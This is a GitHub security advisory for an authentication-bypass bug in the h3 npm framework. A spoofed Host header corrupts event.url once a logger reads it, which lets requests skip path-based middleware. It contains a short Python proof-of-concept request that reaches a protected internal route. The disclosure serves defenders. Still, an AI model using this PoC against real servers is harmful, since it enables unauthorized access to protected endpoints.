# [H] h3 has a middleware bypass with one gadget

## Summary
Severity: High
Advisory: GHSA-3vj8-jmxq-cgj5
CVE: CVE-2026-33131
CWE: CWE-290
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-3vj8-jmxq-cgj5
Type: github-advisory

## Affected
- npm: `h3` — affected >=2.0.0-0 <2.0.1-rc.15

## Details
# H3 NodeRequestUrl bugs 

Vulnerable pieces of code : 
```js
import { H3, serve, defineHandler, getQuery, getHeaders, readBody, defineNodeHandler } from "h3";
let app = new H3()

const internalOnly = defineHandler((event, next) => {
  const token = event.headers.get("x-internal-key");

  if (token !== "SUPERRANDOMCANNOTBELEAKED") {
    return new Response("Forbidden", { status: 403 });
  }

  return next();
});
const logger = defineHandler((event, next) => {
    console.log("Logging : " +  event.url.hostname)
    return next() 
})
app.use(logger);
app.use("/internal/run", internalOnly);


app.get("/internal/run", () => {
  return "Internal OK";
});

serve(app, { port: 3001 });
```

The middleware is super safe now with just a logger and a middleware to block internal access.
But there's one problems here at the logger .
When it log out the ```event.url``` or ```event.url.hostname``` or ```event.url._url```

It will lead to trigger one specials method 

```js 
// _url.mjs FastURL
get _url() {
    if (this.#url) return this.#url;
    this.#url = new NativeURL(this.href);
    this.#href = void 0;
    this.#protocol = void 0;
    this.#host = void 0;
    this.#pathname = void 0;
    this.#search = void 0;
    this.#searchParams = void 0;
    this.#pos = void 0;
    return this.#url;
}
```

The `NodeRequestUrl` is extends from `FastURL` so when we just access ```.url``` or trying to dump all data of this class . This function will be triggered !! 

And as debugging , the `this.#url` is null and will reach to this  code  : 
```js
 this.#url = new NativeURL(this.href);
```
Where is the `this.href` comes from ? 
```js 
get href() {
    if (this.#url) return this.#url.href;
    if (!this.#href) this.#href = `${this.#protocol || "http:"}//${this.#host || "localhost"}${this.#pathname || "/"}${this.#search || ""}`;
    return this.#href;
}
```
Because the `this.#url` is still null so `this.#href` is built up by : 
```js
if (!this.#href) this.#href = `${this.#protocol || "http:"}//${this.#host || "localhost"}${this.#pathname || "/"}${this.#search || ""}`;
```
Yeah and this is untrusted data go . An attacker can pollute the `Host` header from requests lead overwrite the `event.url` .

# Middleware bypass
What can be done with overwriting the `event.url`? 
Audit the code we can easily realize that the `routeHanlder` is found before running any middlewares 
```js
handler(event) {
    const route = this["~findRoute"](event);
    if (route) {
        event.context.params = route.params;
        event.context.matchedRoute = route.data;
    }
    const routeHandler = route?.data.handler || NoHandler;
    const middleware = this["~getMiddleware"](event, route);
    return middleware.length > 0 ? callMiddleware(event, middleware, routeHandler) : routeHandler(event);
}
```

So the handleRoute is fixed but when checking with middleware it check with the **spoofed** one lead to **MIDDLEWARE BYPASS**

We have this poc : 
```py
import requests
url = "http://localhost:3000"
headers = {
    "Host":f"localhost:3000/abchehe?"
}
res = requests.get(f"{url}/internal/run",headers=headers)
print(res.text)
```

This is really dangerous if some one just try to dump all the `event.url` or something that trigger `_url()` from class FastURL and need a fix immediately.

## References
- https://github.com/h3js/h3/security/advisories/GHSA-3vj8-jmxq-cgj5
- https://nvd.nist.gov/vuln/detail/CVE-2026-33131
- https://github.com/h3js/h3
